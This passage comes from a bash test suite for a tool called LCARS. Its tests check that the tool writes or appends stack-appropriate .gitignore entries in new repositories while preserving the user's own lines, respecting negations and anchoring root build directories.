elif gi_ignores "$unc" '__pycache__/mod.pyc' && gi_ignores "$unc" 'x.pyc'; then
  if gi_ignores "$cov" '__pycache__/mod.pyc'; then
    ok "J2c. a hand-written .gitignore that ignored no python litter now ignores __pycache__ and *.pyc (git says so), and the already-covered control still does too"
  else
    bad "J2c. CONTROL FAILED — the already-covered repo does not ignore __pycache__ either, so the probe itself is broken"
  fi
else
  bad "J2c. THE LIVE DEFECT IS BACK — the delivered tree still does not ignore python litter:
$(sed 's/^/         /' "$unc/.gitignore")"
fi

# J2d. …and the human's lines survive VERBATIM, IN ORDER, AS A PREFIX. Not a
#      checksum: the file is expected to have grown. Nothing of his may be
#      reordered, rewritten, de-duplicated or dropped.
if [ "$(head -c "${#GI_HAND}" "$unc/.gitignore")" = "$(printf '%s' "$GI_HAND")" ]; then
  ok "J2d. …and the captain's own lines survive verbatim and in order as the prefix of the new file"
else
  bad "J2d. the captain's lines did not survive as a prefix:
$(sed 's/^/         /' "$unc/.gitignore")"
fi

# J2e. …inside a block that NAMES LCARS and tells him it is his to delete, so the
#      next human can tell our lines from his own.
if grep -qi 'LCARS' "$unc/.gitignore" && grep -qi 'delete' "$unc/.gitignore"; then
  ok "J2e. …and the appended lines sit in a marked block naming LCARS and saying they may be deleted"
else
  bad "J2e. the appended lines carry no marked, attributed, deletable header"
fi

# J2f. A ZERO-BYTE .gitignore IGNORES NOTHING, so it is not an opinion. This is
#      the other shape the live defect wore (`git init` plus a touched file, or
#      `gh repo create --gitignore=<wrong template>`).
zero="$(new_mission_repo python)"
: > "$zero/.gitignore"
( cd "$zero" && git add -A && git commit -qm "an empty gitignore" )
apply_setup "$zero" "$gi_mf" "$gi_sd" "" LCARS_SETUP_GREENFIELD=1
if [ "$ASRC" != 0 ]; then
  bad "J2f. the zero-byte-gitignore scaffold was REFUSED (note: $ASNOTE)"
elif ! gi_ignores "$zero" '__pycache__/mod.pyc'; then
  bad "J2f. a ZERO-BYTE .gitignore was treated as a human's opinion — the litter is still not ignored ($(wc -c < "$zero/.gitignore" | tr -d ' ') bytes)"
elif [ "$cov_before" = "$cov_after" ]; then
  ok "J2f. a zero-byte .gitignore covers nothing, so the whole block is appended (while the thorough one next door is still untouched)"
else
  bad "J2f. CONTROL FAILED — the already-covered repo was rewritten too, so 'appended because uncovered' proves nothing"
fi

# J2g. ONLY THE UNCOVERED PATTERNS ARE APPENDED. His file already ignores
#      `.DS_Store`; ours must not restate it. This is what makes the append
#      evidence-gated rather than a blind paste of the whole seed body.
appended="$(awk '/Added by LCARS/{f=1} f' "$unc/.gitignore")"
if printf '%s' "$appended" | grep -Fq '__pycache__/' \
   && ! printf '%s' "$appended" | grep -Fqx '.DS_Store'; then
  ok "J2g. …and ONLY the uncovered patterns were appended — .DS_Store, which his file already ignored, was not restated"
elif ! printf '%s' "$appended" | grep -Fq '__pycache__/'; then
  bad "J2g. the appended block does not carry the uncovered python litter at all"
else
  bad "J2g. the append restated a pattern the repo already ignored (.DS_Store):
$(printf '%s' "$appended" | sed 's/^/         /')"
fi

# J2h. A `!` NEGATION IS RESPECTED, which is the whole reason this asks git
#      instead of grepping. A file that ignores `__pycache__/` and then UN-ignores
#      one path inside it still covers the pattern, and must be left alone — a
#      text match for the negation line would get this backwards.
neg="$(gi_covered_repo)"
printf '!__pycache__/keep.pyc\n' >> "$neg/.gitignore"
( cd "$neg" && git add -A && git commit -qm "a negation" )
neg_before="$(shasum "$neg/.gitignore" | awk '{print $1}')"
apply_setup "$neg" "$gi_mf" "$gi_sd" "" LCARS_SETUP_GREENFIELD=1
neg_after="$(shasum "$neg/.gitignore" | awk '{print $1}')"
if [ "$ASRC" != 0 ]; then
  bad "J2h. the negation-repo scaffold was REFUSED (note: $ASNOTE)"
elif [ "$unc_before" = "$unc_after" ]; then
  bad "J2h. CONTROL FAILED — the uncovered repo was untouched too"
elif [ "$neg_before" = "$neg_after" ]; then
  ok "J2h. a .gitignore carrying a ! negation is still judged COVERED by git and left byte-identical (while the uncovered one is appended to)"
else
  bad "J2h. the negation file was rewritten:
$(sed 's/^/         /' "$neg/.gitignore")"
fi

# J2i. THE OUTCOME IS ON SCREEN. The live run's worst half was the SILENCE: the
#      delivered commit carried litter, the mission advanced, and the only trace
#      anywhere was one line in events.jsonl. Each of the three outcomes must
#      show up in the stage's normal output.
seed_out=""
seed_repo="$(new_mission_repo python)"
apply_setup "$seed_repo" "$gi_mf" "$gi_sd" "" LCARS_SETUP_GREENFIELD=1
seed_out="$OUT"
n_vis=0
printf '%s' "$seed_out" | grep -q '\.gitignore' && n_vis=$((n_vis+1))
printf '%s' "$unc_out"  | grep -q '\.gitignore' && n_vis=$((n_vis+1))
printf '%s' "$cov_out"  | grep -q '\.gitignore' && n_vis=$((n_vis+1))
if [ "$n_vis" = 3 ]; then
  ok "J2i. all three outcomes (seeded / appended / kept) are visible in the stage's own output, not just events.jsonl"
else
  bad "J2i. only $n_vis of the 3 .gitignore outcomes reach the screen — the live run's silence is still there
         seeded:   $(printf '%s' "$seed_out" | grep -c '\.gitignore')
         appended: $(printf '%s' "$unc_out"  | grep -c '\.gitignore')
         kept:     $(printf '%s' "$cov_out"  | grep -c '\.gitignore')"
fi

# J2j. THE PERMANENT COPY IS HONEST TOO (S298 fix round 3). Round 2 fixed the
#      SCREEN line, which scrolls away; this header lives in the captain's repo
#      forever. It used to end "your own lines above were not touched" — true of
#      the bytes, false of the behaviour, because git applies the LAST matching
#      pattern, so a rule in our block can override one of his above it. The
#      permanent copy must make the same distinction the screen now makes: his
#      lines preserved, the override named, the undo stated. It must also be
#      legible to a passer-by — a DATE, no in-house vocabulary.
#
#      CONTROLLED by the already-covered repo, which gains no header at all, so
#      "the header says the right thing" cannot pass on a file with no header.
gi_appended_header() { # file → the appended block's leading comment lines
  awk '/Added by LCARS/{f=1} f { if ($0 !~ /^#/) exit; print }' "$1"
}
unc_hdr="$(gi_appended_header "$unc/.gitignore")"
if [ -z "$unc_hdr" ]; then
  bad "J2j. the appended block carries no header at all"
elif grep -q 'Added by LCARS' "$cov/.gitignore"; then
  bad "J2j. CONTROL FAILED — the already-covered repo gained a header too, so a header's wording proves nothing"
elif printf '%s\n' "$unc_hdr" | grep -Eqi 'not touched|untouched|unchanged'; then
  bad "J2j. the permanent header still makes the unqualified 'untouched' claim round 2 removed from the screen:
$(printf '%s\n' "$unc_hdr" | sed 's/^/         /')"
elif ! printf '%s\n' "$unc_hdr" | grep -Eqi 'last (matching )?(pattern|match|rule)'; then
  bad "J2j. the permanent header does not state git's last-match-wins caveat:
$(printf '%s\n' "$unc_hdr" | sed 's/^/         /')"
elif ! printf '%s\n' "$unc_hdr" | grep -Eqi 'override|overrides'; then
  bad "J2j. the permanent header names no consequence of last-match-wins (nothing about overriding his lines):
$(printf '%s\n' "$unc_hdr" | sed 's/^/         /')"
elif ! printf '%s\n' "$unc_hdr" | grep -Eq '[0-9]{4}-[0-9]{2}-[0-9]{2}'; then
  bad "J2j. the permanent header carries no date, so it cannot age legibly for the next reader:
$(printf '%s\n' "$unc_hdr" | sed 's/^/         /')"
elif printf '%s\n' "$unc_hdr" | grep -qi 'test foundation was established'; then
  bad "J2j. the permanent header still dates itself in in-house vocabulary a stranger cannot parse:
$(printf '%s\n' "$unc_hdr" | sed 's/^/         /')"
else
  ok "J2j. the permanent header preserves his lines, NAMES the last-match-wins override and its undo, and carries a plain date (while the covered repo gains no header)"
fi

# J2k. EVERY PROSE LINE IN THE BLOCK IS A COMMENT. A header line that lost its
#      '#' would not be an ugly header — it would be a live ignore pattern in the
#      captain's repo. Prose is identified by carrying a space, which no ignore
#      pattern in the seed body does, so this cannot pass by finding nothing:
#      the block is also asserted to hold at least one comment AND at least one
#      bare pattern.
gi_block() { # file → the whole appended block, header through end marker
  awk '/Added by LCARS/{f=1} f {print} /end LCARS block/{if(f) exit}' "$1"
}
unc_block="$(gi_block "$unc/.gitignore")"
blk_cmts="$(printf '%s\n' "$unc_block" | grep -c '^#' || true)"
blk_pats="$(printf '%s\n' "$unc_block" | grep -cv '^#' || true)"
blk_bad="$(printf '%s\n' "$unc_block" | grep -v '^#' | grep ' ' || true)"
if [ "$blk_cmts" -lt 1 ] || [ "$blk_pats" -lt 1 ]; then
  bad "J2k. the appended block is not header-plus-patterns ($blk_cmts comment line(s), $blk_pats pattern line(s)) — the comment check would prove nothing"
elif [ -n "$blk_bad" ]; then
  bad "J2k. a prose line in the appended block is NOT a comment, so it is now a live ignore pattern:
$(printf '%s\n' "$blk_bad" | sed 's/^/         /')"
else
  ok "J2k. every prose line in the appended block is a # comment ($blk_cmts comment, $blk_pats pattern line(s)) — no header line became an ignore rule"
fi

# J3. THE ENTRIES MATCH THE DETECTED STACK, not a fixed list. One variable moves
#     across these rows — the arm the product resolves — pinned through
#     $LCARS_SETUP_STACK, which is `setup_stack_arm`'s own first source. Each
#     arm's own litter must be there and the other six arms' must NOT be, which
#     is what a single hardcoded list could never satisfy.
gi_blank_repo() { # → a greenfield repo with NO stack marker but a detectable runner
  local r; r="$(new_mission_repo_bare js)"
  rm -f "$r/package.json"
  printf 'test:\n\t@echo ok\n' > "$r/Makefile"
  ( cd "$r" && git add -A && git commit -qm makefile )
  printf '%s' "$r"
}
for a in $ARMS; do
  repo="$(gi_blank_repo)"
  apply_setup "$repo" "$gi_mf" "$gi_sd" "" LCARS_SETUP_GREENFIELD=1 LCARS_SETUP_STACK="$a"
  if [ "$ASRC" != 0 ]; then
    bad "J3-$a. the $a scaffold was REFUSED (note: $ASNOTE)"; continue
  fi
  if [ ! -f "$repo/.gitignore" ]; then
    bad "J3-$a. no .gitignore written on the $a arm"; continue
  fi
  if ! grep -Fq "$(gi_token "$a")" "$repo/.gitignore"; then
    bad "J3-$a. the $a .gitignore does not ignore $(gi_token "$a")"; continue
  fi
  foreign=""
  for b in $ARMS; do
    [ "$b" = "$a" ] && continue
    grep -Fq "$(gi_token "$b")" "$repo/.gitignore" && foreign="$foreign $(gi_token "$b")"
  done
  if [ -n "$foreign" ]; then
    bad "J3-$a. the $a .gitignore carries FOREIGN entries:$foreign (a fixed list, not a stack-appropriate one)"
  else
    ok "J3-$a. the $a arm ignores $(gi_token "$a") and no other arm's litter"
  fi
done

# J3b. THE APPEND PATH ON EVERY ARM, not just python — the J3 rule, repeated on
#      the side of the fork a pre-existing .gitignore sends the repo down. The
#      coverage question is asked PER PATTERN, and the per-arm rows carry exactly
#      the shapes most likely to derive a nonsense probe path: a rooted
#      `/target/`, a `**/` prefix, a `[Bb]in/` character class, a trailing `*`.
#      Each arm's own litter must come out IGNORED (git says so, not a grep), and
#      the other six arms' must not have been appended — the live control that
#      stops a blind paste of a fixed list from passing this.
gi_token_path() { # arm → a real path that arm's litter actually lands at
  case "$1" in
    js)     printf 'node_modules/pkg/index.js' ;;
    python) printf '__pycache__/mod.pyc' ;;
    rust)   printf 'src/lib.rs.bk' ;;
    go)     printf 'go.work.sum' ;;
    dotnet) printf 'obj/Debug/app.dll' ;;
    jvm)    printf '.gradle/caches/x' ;;
    ruby)   printf '.bundle/config' ;;
  esac
}
for a in $ARMS; do
  repo="$(gi_blank_repo)"
  printf '%s' "$GI_HAND" > "$repo/.gitignore"
  ( cd "$repo" && git add -A && git commit -qm "the captain's gitignore" )
  apply_setup "$repo" "$gi_mf" "$gi_sd" "" LCARS_SETUP_GREENFIELD=1 LCARS_SETUP_STACK="$a"
  if [ "$ASRC" != 0 ]; then
    bad "J3b-$a. the $a scaffold was REFUSED on the append path (note: $ASNOTE)"; continue
  fi
  if ! gi_ignores "$repo" "$(gi_token_path "$a")"; then
    bad "J3b-$a. after the append, git still does not ignore $(gi_token_path "$a") on the $a arm:
$(sed 's/^/         /' "$repo/.gitignore")"; continue
  fi
  appended="$(awk '/Added by LCARS/{f=1} f' "$repo/.gitignore")"
  foreign=""
  for b in $ARMS; do
    [ "$b" = "$a" ] && continue
    printf '%s' "$appended" | grep -Fq "$(gi_token "$b")" && foreign="$foreign $(gi_token "$b")"
  done
  if [ -n "$foreign" ]; then
    bad "J3b-$a. the $a append carried FOREIGN entries:$foreign (a fixed list, not an evidence-gated one)"
  else
    ok "J3b-$a. the $a arm's append makes git ignore $(gi_token_path "$a") and brings no other arm's litter"
  fi
done

# J4. AN UNATTRIBUTABLE REPO INVENTS NOTHING. A repo LCARS cannot land on an arm
#     (`unknown` — the same verdict the allowlist's union fallback is for) still
#     gets the stack-agnostic litter, and must NOT be handed a guess at an
#     ecosystem it has no evidence for.
repo="$(gi_blank_repo)"
apply_setup "$repo" "$gi_mf" "$gi_sd" "" LCARS_SETUP_GREENFIELD=1
if [ "$ASRC" != 0 ]; then
  bad "J4. the unattributable scaffold was REFUSED (note: $ASNOTE)"
elif [ ! -f "$repo/.gitignore" ]; then
  bad "J4. no .gitignore written on an unattributable repo"
else
  guessed=""
  for b in $ARMS; do
    grep -Fq "$(gi_token "$b")" "$repo/.gitignore" && guessed="$guessed $(gi_token "$b")"
  done
  if [ -n "$guessed" ]; then
    bad "J4. an unattributable repo was GUESSED a stack:$guessed"
  elif grep -Fq '.DS_Store' "$repo/.gitignore"; then
    ok "J4. an unattributable repo gets the stack-agnostic litter and no guessed ecosystem"
  else
    bad "J4. the unattributable .gitignore is empty of even the stack-agnostic litter"
  fi
fi

# J4b. …and the seed is RECORDED, on that arm too. The mission log is where a
#      human finds out LCARS wrote a file into their repo, so a silent seed is a
#      seed nobody consented to. Asserted on the UNATTRIBUTABLE arm specifically:
#      it is the row whose ignore body is EMPTY, i.e. the one where a writer built
#      out of `&&`-chained steps quietly reports failure and logs nothing.
ev="$repo/.git/lcars/missions/m-001/events.jsonl"
if [ -f "$ev" ] && grep -q '"type":"gitignore_seeded"' "$ev"; then
  ok "J4b. …and the seed is recorded in the mission log on that arm too"
else
  bad "J4b. the .gitignore was written with nothing recorded in the mission log"
fi

# J5. NOT GREENFIELD → NOTHING IS WRITTEN. THE OTHER REGRESSION-SENSITIVE ONE.
#     The evidence-gated package arm fires inside repos the captain already owns,
#     where a .gitignore's absence is HIS decision and writing one is LCARS
#     editing a repo it was not invited to shape. Paired with the greenfield
#     control on the identical repo + declaration, so it cannot pass vacuously.
repo="$(new_mission_repo python)"
apply_setup "$repo" "$gi_mf" "$gi_sd" ""
nong_rc="$ASRC"; nong_note="$ASNOTE"
ctl="$(new_mission_repo python)"
apply_setup "$ctl" "$gi_mf" "$gi_sd" "" LCARS_SETUP_GREENFIELD=1
if [ "$nong_rc" != 0 ]; then
  bad "J5. the evidence-gated apply itself failed, so the absence proves nothing (note: $nong_note)"
elif [ ! -f "$ctl/.gitignore" ]; then
  bad "J5. CONTROL FAILED — the greenfield arm wrote nothing either, so this is vacuous"
elif [ ! -e "$repo/.gitignore" ]; then
  ok "J5. a NON-greenfield declared setup writes no .gitignore (while greenfield on the same repo shape does)"
else
  bad "J5. the evidence-gated arm wrote a .gitignore into a repo the captain already owns:
$(sed 's/^/         /' "$repo/.gitignore")"
fi

# J6. THE ROOT-LEVEL OUTPUT DIRECTORIES ARE ANCHORED, SO A HAND-WRITTEN SOURCE
#     FILE AT DEPTH IS STILL TRACKED.
#
#     MEASURED, S298 fix round 2: a fresh tester drove the real pipeline, then
#     asked `git check-ignore` about the delivered tree of a repo LCARS had just
#     set up. `tools/build/gen.py`, `docs/build/conf.py`, `src/dist/index.js`,
#     `pkg/dist/README.md` and `scripts/venv/setup.sh` all came back IGNORED —
#     hand-written files a human plainly wants committed, lost to the nastiest
#     failure mode there is: a file that silently never commits and whose
#     absence nothing reports. A bare `build/` in a .gitignore matches at EVERY
#     depth; LCARS knows this repo is brand new and that its build output is at
#     the root, so anchoring the root-level output directories costs nothing.
#
#     PAIRED BY CONSTRUCTION. The table below is REJECTED unless it carries both
#     verdicts, so the one mechanism — this repo's real ignore chain — has to say
#     `tracked` for one row and `ignored` for another. Two arms printing the same
#     answer is a failed control, never a pass.
gi_assert_table() { # id  repo  ok-message  <<< "want<space>path" rows
  local id="$1" r="$2" msg="$3" want path wrong="" n_t=0 n_i=0 got
  while read -r want path; do
    [ -n "${want:-}" ] && [ -n "${path:-}" ] || continue
    mkdir -p "$r/$(dirname "$path")" 2>/dev/null
    : > "$r/$path" 2>/dev/null
    if gi_ignores "$r" "$path"; then got=ignored; else got=tracked; fi
    case "$want" in
      tracked) n_t=$((n_t + 1)) ;;
      ignored) n_i=$((n_i + 1)) ;;
    esac
    [ "$got" = "$want" ] || wrong="$wrong
           $path — wanted $want, git says $got"
  done
  if [ "$n_t" -eq 0 ] || [ "$n_i" -eq 0 ]; then
    bad "$id. TABLE NOT PAIRED — $n_t tracked / $n_i ignored row(s); one verdict alone proves nothing"
  elif [ -n "$wrong" ]; then
    bad "$id. $msg — but git disagrees on:$wrong
$(sed 's/^/         /' "$r/.gitignore")"
  else
    ok "$id. $msg"
  fi
}

# J6a. The python arm: every path the tester measured as wrongly IGNORED, each
#      paired with the root-level litter the same pattern must still catch.
repo="$(new_mission_repo python)"
apply_setup "$repo" "$gi_mf" "$gi_sd" "" LCARS_SETUP_GREENFIELD=1
if [ "$ASRC" != 0 ]; then
  bad "J6a. the python scaffold was REFUSED before the anchoring question (note: $ASNOTE)"
elif [ ! -f "$repo/.gitignore" ]; then
  bad "J6a. no .gitignore written, so the anchoring question is vacuous"
else
  gi_assert_table J6a "$repo" \
    "a root-anchored build/dist/venv keeps a hand-written file at depth TRACKED while the root litter stays IGNORED" <<'ROWS'
tracked tools/build/gen.py
tracked docs/build/conf.py
tracked src/dist/index.js
tracked pkg/dist/README.md
tracked scripts/venv/setup.sh
ignored build/lib/app/mod.py
ignored dist/app-1.0.tar.gz
ignored venv/bin/activate
ROWS
fi

# J6b. …and the patterns that GENUINELY NEST are still unanchored, which is the
#      other half of the judgement: `__pycache__/` and `*.egg-info/` sit beside
#      source at any depth, and anchoring them would put the original measured
#      defect straight back. Same repo, same ignore chain, opposite verdict.
if [ -f "$repo/.gitignore" ]; then
  gi_assert_table J6b "$repo" \
    "the genuinely-nesting python patterns are still unanchored — litter at depth is IGNORED while its sibling source is TRACKED" <<'ROWS'
ignored pkg/__pycache__/mod.pyc
ignored src/deep/pkg/__pycache__/mod.cpython-311.pyc
ignored src/app.egg-info/PKG-INFO
tracked pkg/mod.py
tracked src/deep/pkg/mod.py
ROWS
fi

# J6c. The js arm — `node_modules/` must stay unanchored, because a workspace
#      repo really does carry `packages/<pkg>/node_modules/`, while `dist/` and
#      `build/` must not swallow a hand-written file at depth.
repo="$(gi_blank_repo)"
apply_setup "$repo" "$gi_mf" "$gi_sd" "" LCARS_SETUP_GREENFIELD=1 LCARS_SETUP_STACK=js
if [ "$ASRC" != 0 ] || [ ! -f "$repo/.gitignore" ]; then
  bad "J6c. the js scaffold wrote no .gitignore to judge (rc=$ASRC note: $ASNOTE)"
else
  gi_assert_table J6c "$repo" \
    "the js arm nests node_modules/ (a workspace repo has one per package) but anchors dist/ and build/" <<'ROWS'
ignored packages/a/node_modules/dep/index.js
ignored node_modules/dep/index.js
ignored dist/bundle.js
ignored build/main.js
tracked packages/a/src/index.js
tracked tools/build/codegen.js
tracked src/dist/index.js
ROWS
fi

# J6d. The ruby arm — `log/` and `tmp/` are the most dangerous unanchored
#      patterns in the whole table: `lib/log/logger.rb` and `app/tmp/sweeper.rb`
#      are ordinary hand-written Ruby, and a bare `log/` makes both vanish.
repo="$(gi_blank_repo)"
apply_setup "$repo" "$gi_mf" "$gi_sd" "" LCARS_SETUP_GREENFIELD=1 LCARS_SETUP_STACK=ruby
if [ "$ASRC" != 0 ] || [ ! -f "$repo/.gitignore" ]; then
  bad "J6d. the ruby scaffold wrote no .gitignore to judge (rc=$ASRC note: $ASNOTE)"
else
  gi_assert_table J6d "$repo" \
    "the ruby arm anchors log/, tmp/ and vendor/bundle/ at the root, so hand-written lib/log and app/tmp stay TRACKED" <<'ROWS'
tracked lib/log/logger.rb
tracked app/tmp/sweeper.rb
tracked vendor/assets/app.js
ignored log/development.log
ignored tmp/cache/x
ignored vendor/bundle/ruby/3.2.0/gems/x
ROWS
fi

# J6e. The jvm arm — `target/` and `build/` anchored, `.gradle/` not (a
#      multi-project build writes one per subproject, and nobody hand-writes
#      source inside a dot-directory a tool owns).
repo="$(gi_blank_repo)"
apply_setup "$repo" "$gi_mf" "$gi_sd" "" LCARS_SETUP_GREENFIELD=1 LCARS_SETUP_STACK=jvm
if [ "$ASRC" != 0 ] || [ ! -f "$repo/.gitignore" ]; then
  bad "J6e. the jvm scaffold wrote no .gitignore to judge (rc=$ASRC note: $ASNOTE)"
else
  gi_assert_table J6e "$repo" \
    "the jvm arm anchors target/ and build/ while .gradle/ still nests per subproject" <<'ROWS'
tracked src/target/Main.java
tracked modules/build/Generator.java
ignored target/classes/Main.class
ignored build/libs/app.jar
ignored sub/project/.gradle/caches/x
ROWS
fi

# J6g. THE DOTNET ARM IS DELIBERATELY *NOT* ANCHORED, and this pins that call so
#      it cannot drift into a silent one. MSBuild writes `bin/` and `obj/` into
#      EVERY project directory (`src/App/bin/Debug/`), so the nesting is
#      structural to the ecosystem exactly as it is for `node_modules/`, and the
#      canonical VisualStudio template leaves `[Bb]in/`/`[Oo]bj/` unanchored for
#      that reason. Note the ASYMMETRY with the go arm, which anchors `/bin/`:
#      `bin` is reserved by convention under MSBuild but is an ordinary
#      hand-written directory in a Go repo, so the two arms differ on evidence,
#      not by accident. Paired as always — nested output ignored, source tracked.
repo="$(gi_blank_repo)"
apply_setup "$repo" "$gi_mf" "$gi_sd" "" LCARS_SETUP_GREENFIELD=1 LCARS_SETUP_STACK=dotnet
if [ "$ASRC" != 0 ] || [ ! -f "$repo/.gitignore" ]; then
  bad "J6g. the dotnet scaffold wrote no .gitignore to judge (rc=$ASRC note: $ASNOTE)"
else
  gi_assert_table J6g "$repo" \
    "the dotnet arm leaves [Bb]in/ and [Oo]bj/ unanchored on purpose — MSBuild writes them per project, at depth" <<'ROWS'
ignored src/App/bin/Debug/App.dll
ignored src/App/obj/project.assets.json
ignored bin/Debug/App.dll
ignored tests/App.Tests/TestResults/r.trx
tracked src/App/Program.cs
tracked src/App/Models/User.cs
ROWS
fi

# J6h. THE GO ARM KEEPS ITS `/bin/` ANCHORED, which is the other side of that
#      asymmetry: `scripts/bin/release.sh` is ordinary hand-written shell in a Go
#      repo and must survive, while the root `bin/` a `go build -o` fills must not.
repo="$(gi_blank_repo)"
apply_setup "$repo" "$gi_mf" "$gi_sd" "" LCARS_SETUP_GREENFIELD=1 LCARS_SETUP_STACK=go
if [ "$ASRC" != 0 ] || [ ! -f "$repo/.gitignore" ]; then
  bad "J6h. the go scaffold wrote no .gitignore to judge (rc=$ASRC note: $ASNOTE)"
else
  gi_assert_table J6h "$repo" \
    "the go arm's /bin/ is anchored, so scripts/bin stays TRACKED while the root bin/ is IGNORED" <<'ROWS'
tracked scripts/bin/release.sh
tracked internal/bin/encode.go
ignored bin/app
ROWS
fi

# J6f. THE APPEND PATH CARRIES THE SAME ANCHORING. The uncovered repo gained its
#      block through `greenfield_append_gitignore`, whose lines come from the
#      same body — so the fix must hold on both sides of the fork, judged on the
#      file the real append actually wrote.
if [ "$unc_rc" = 0 ]; then
  gi_assert_table J6f "$unc" \
    "the APPENDED block anchors the same patterns the seed does (depth tracked, root ignored)" <<'ROWS'
tracked tools/build/gen.py
tracked src/dist/index.js
tracked scripts/venv/setup.sh
ignored build/lib/app/mod.py
ignored dist/app-1.0.tar.gz
ignored pkg/__pycache__/mod.pyc
ROWS
else
  bad "J6f. the uncovered-repo append never ran, so the append-side anchoring is unproven"
fi

# J7. THE APPENDED BLOCK HAS A VISIBLE END. It had a marked top and no bottom,
#     so a human who later adds lines underneath leaves nobody — themselves
#     included — able to tell where LCARS's block stops. The block's own text
#     promises it is "yours to delete or edit freely"; that promise is only
#     actionable if its extent is visible. Paired against the KEPT repo, which
#     must carry no marker at all, so "the marker exists" is our append's doing
#     and not something incidental to a .gitignore.
gi_hdr_ln="$(grep -n 'Added by LCARS' "$unc/.gitignore" | head -1 | cut -d: -f1)"
gi_end_ln="$(grep -n 'end LCARS' "$unc/.gitignore" | head -1 | cut -d: -f1)"
gi_last_ln="$(grep -c '' "$unc/.gitignore")"
if grep -q 'end LCARS' "$cov/.gitignore" 2>/dev/null; then
  bad "J7. CONTROL FAILED — the untouched (kept) .gitignore carries an end marker too, so finding one proves nothing"
elif [ -z "$gi_end_ln" ]; then
  bad "J7. the appended block is marked at the top and NOT at the bottom — a human adding lines below cannot tell where LCARS's block ends
$(sed 's/^/         /' "$unc/.gitignore")"
elif [ -z "$gi_hdr_ln" ] || [ "$gi_hdr_ln" -ge "$gi_end_ln" ]; then
  bad "J7. the end marker is not below the block's header (header line $gi_hdr_ln, end line $gi_end_ln)"
elif [ "$gi_end_ln" != "$gi_last_ln" ]; then
  bad "J7. the end marker is not the block's last line (end line $gi_end_ln of $gi_last_ln) — lines of ours sit below it:
$(sed -n "$((gi_end_ln + 1)),\$p" "$unc/.gitignore" | sed 's/^/         /')"
else
  ok "J7. the appended block is delimited top AND bottom, so it is one-gesture deletable (while the kept file carries no marker at all)"
fi

# ===========================================================================
# G. ZERO SPEND
# ===========================================================================
n="$(grep -c '^SPAWN' "$SPEND_LOG" 2>/dev/null | head -1)"
if [ "${n:-0}" = "0" ]; then
  ok "G1. ZERO worker spend across the whole suite (counting shim saw 0 spawns)"
else
  bad "G1. the suite SPAWNED $n worker(s) — money leaked"
fi

printf '\nstack-arms: %d passed, %d failed, %d skipped\n' "$PASS" "$FAIL" "$SKIP"
[ "$FAIL" -eq 0 ]
